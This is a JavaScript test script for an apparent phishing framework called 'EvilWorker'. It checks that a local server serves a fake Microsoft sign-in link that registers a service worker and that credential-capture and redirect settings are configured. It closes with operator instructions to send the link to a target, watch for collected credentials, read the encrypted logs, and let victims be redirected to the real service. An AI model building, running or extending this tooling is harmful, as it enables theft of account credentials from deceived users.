const https = require('https');

// Test the credential redirect feature
async function testCredentialRedirect() {
    console.log('🧪 Testing EvilWorker Credential Redirect Feature\n');
    
    const baseUrl = 'http://localhost:3000';
    
    // Test 1: Health check
    console.log('1. Testing health endpoint...');
    try {
        const response = await fetch(`${baseUrl}/`);
        const data = await response.json();
        console.log(`✅ Health: ${data.status} - Uptime: ${Math.round(data.uptime)}s\n`);
    } catch (error) {
        console.log(`❌ Health check failed: ${error.message}\n`);
    }
    
    // Test 2: Phishing link (should return HTML with service worker)
    console.log('2. Testing phishing link...');
    try {
        const phishingUrl = `${baseUrl}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;
        const response = await fetch(phishingUrl);
        const text = await response.text();
        
        if (text.includes('serviceWorker')) {
            console.log('✅ Phishing link: Working - Service worker registration found');
            console.log(`📄 Response length: ${text.length} characters\n`);
        } else {
            console.log('❌ Phishing link: Unexpected response\n');
        }
    } catch (error) {
        console.log(`❌ Phishing link failed: ${error.message}\n`);
    }
    
    // Test 3: Configuration check
    console.log('3. Testing configuration...');
    try {
        const config = require('./config');
        console.log(`✅ Credential redirect enabled: ${config.credentials.enableRedirect}`);
        console.log(`✅ Redirect URL: ${config.credentials.redirectUrl}`);
        console.log(`✅ Credential keywords: ${config.credentials.credentialKeywords.length} configured`);
        console.log(`✅ Login endpoints: ${config.credentials.loginEndpoints.length} configured\n`);
    } catch (error) {
        console.log(`❌ Configuration test failed: ${error.message}\n`);
    }
    
    console.log('🎯 Credential Redirect Feature Summary:');
    console.log('   • Framework is running and ready');
    console.log('   • Credential detection is configured');
    console.log('   • Automatic redirect will occur after credential collection');
    console.log('   • All events are logged and encrypted');
    console.log('\n📋 Next Steps:');
    console.log('   1. Send the phishing link to your target');
    console.log('   2. Monitor the console for [CREDENTIALS_COLLECTED] messages');
    console.log('   3. Check phishing_logs/ directory for encrypted logs');
    console.log('   4. Victims will be redirected to the legitimate service');
}

// Run the test
testCredentialRedirect().catch(console.error);
